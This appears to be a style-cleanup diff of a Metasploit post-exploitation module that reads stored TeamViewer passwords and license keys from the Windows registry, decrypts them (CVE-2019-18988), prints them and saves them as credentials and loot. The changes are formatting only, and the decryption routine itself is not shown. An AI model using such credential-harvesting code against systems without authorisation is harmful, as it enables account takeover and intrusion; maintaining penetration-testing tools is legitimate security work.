@@ -9,16 +9,15 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-        'Name'          => 'Windows Gather TeamViewer Passwords',
-        'Description'   => %q{ This module will find and decrypt stored TeamViewer passwords },
-        'License'       => MSF_LICENSE,
-        'References'    => [ ['CVE', '2019-18988'], [ 'URL', 'https://whynotsecurity.com/blog/teamviewer/'] ],
-        'Author'        => [ 'Nic Losby <blurbdust[at]gmail.com>' ],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+                      'Name' => 'Windows Gather TeamViewer Passwords',
+                      'Description' => ' This module will find and decrypt stored TeamViewer passwords ',
+                      'License' => MSF_LICENSE,
+                      'References' => [ ['CVE', '2019-18988'], [ 'URL', 'https://whynotsecurity.com/blog/teamviewer/'] ],
+                      'Author' => [ 'Nic Losby <blurbdust[at]gmail.com>' ],
+                      'Platform' => [ 'win' ],
+                      'SessionTypes' => [ 'meterpreter' ]))
   end
 
   def app_list
@@ -39,21 +38,22 @@ class MetasploitModule < Msf::Post
     ]
 
     locations = [
-      { :value => 'OptionsPasswordAES', :description => 'Options Password'},
-      { :value => 'SecurityPasswordAES', :description => 'Unattended Password'}, # for < v9.x
-      { :value => 'SecurityPasswordExported', :description => 'Exported Unattended Password'},
-      { :value => 'ServerPasswordAES', :description => 'Backend Server Password'}, # unused according to TeamViewer
-      { :value => 'ProxyPasswordAES', :description => 'Proxy Password'},
-      { :value => 'LicenseKeyAES', :description => 'Perpetual License Key'}, # for <= v14
+      { value: 'OptionsPasswordAES', description: 'Options Password' },
+      { value: 'SecurityPasswordAES', description: 'Unattended Password' }, # for < v9.x
+      { value: 'SecurityPasswordExported', description: 'Exported Unattended Password' },
+      { value: 'ServerPasswordAES', description: 'Backend Server Password' }, # unused according to TeamViewer
+      { value: 'ProxyPasswordAES', description: 'Proxy Password' },
+      { value: 'LicenseKeyAES', description: 'Perpetual License Key' }, # for <= v14
     ]
 
-    keys.each do |parent_key, child_key|
-
+    keys.each do |parent_key, _child_key|
       locations.each do |location|
         secret = registry_getvaldata(parent_key, location[:value])
         next if secret.nil?
+
         plaintext = decrypt(secret)
         next if plaintext.nil?
+
         print_good("Found #{location[:description]}: #{plaintext}")
         results << "#{location[:description]}: #{plaintext}\n"
         store_valid_credential(
@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Post
             last_attempted_at: nil,
             origin_type: :session,
             port: 5938, # https://community.teamviewer.com/t5/Knowledge-Base/Which-ports-are-used-by-TeamViewer/ta-p/4139
-            post_reference_name: self.refname,
+            post_reference_name: refname,
             protocol: 'tcp',
             service_name: 'teamviewer',
             session_id: session_db_id,
@@ -75,10 +75,10 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    #Only save data to disk when there's something in the table
+    # Only save data to disk when there's something in the table
     unless results.empty?
       path = store_loot("host.teamviewer_passwords", "text/plain", session, results, "teamviewer_passwords.txt", "TeamViewer Passwords")
-      print_good("Passwords stored in: #{path.to_s}")
+      print_good("Passwords stored in: #{path}")
     end
   end
 
